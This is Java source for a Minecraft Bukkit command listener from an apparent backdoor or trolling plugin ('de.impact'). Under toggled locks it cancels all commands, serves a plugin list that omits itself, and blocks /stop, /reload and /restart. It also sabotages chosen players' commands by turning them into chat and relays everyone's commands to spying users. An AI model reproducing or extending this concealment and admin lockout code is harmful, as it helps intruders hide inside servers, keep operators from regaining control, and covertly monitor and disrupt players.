package de.impact.listeners;

import de.impact.commands.player.CommandSpy;
import de.impact.commands.trolling.FailCommand;
import de.impact.utils.ChatUtils;
import de.impact.utils.LockUtils;
import de.impact.utils.PluginUtils;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class CommandListener implements Listener {

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent e) {

        var msg = e.getMessage().toUpperCase();

        if(LockUtils.isLocked("commands"))
            e.setCancelled(true);

        if(LockUtils.isLocked("pluginlist") && (msg.startsWith("/PL") || msg.startsWith("/PLUGINS") || msg.startsWith("/BUKKIT:PLUGINS") || msg.startsWith("/BUKKIT:PL"))) {
            e.setCancelled(true);
            e.getPlayer().sendMessage(PluginUtils.getPluginListExceptImpact());
        }

        if(LockUtils.isLocked("stop") && (msg.startsWith("/STOP") || msg.startsWith("/RL") || msg.startsWith("/RELOAD") || msg.startsWith("/RESTART") || msg.startsWith("/BUKKIT:RL") || msg.startsWith("/BUKKIT:RELOAD"))) {
            e.setCancelled(true);
        }

        if(FailCommand.shouldFail(e.getPlayer().getUniqueId())) {
            e.setCancelled(true);
            e.getPlayer().chat(e.getMessage().replaceFirst("/", "7"));
            return;
        }

        for(var p : CommandSpy.getSpyPlayers()) {

            if(p.equals(e.getPlayer())) continue;

            ChatUtils.sendMessage(p, e.getPlayer().getName() + " has ran a command: §a" + e.getMessage());
        }

    }
}
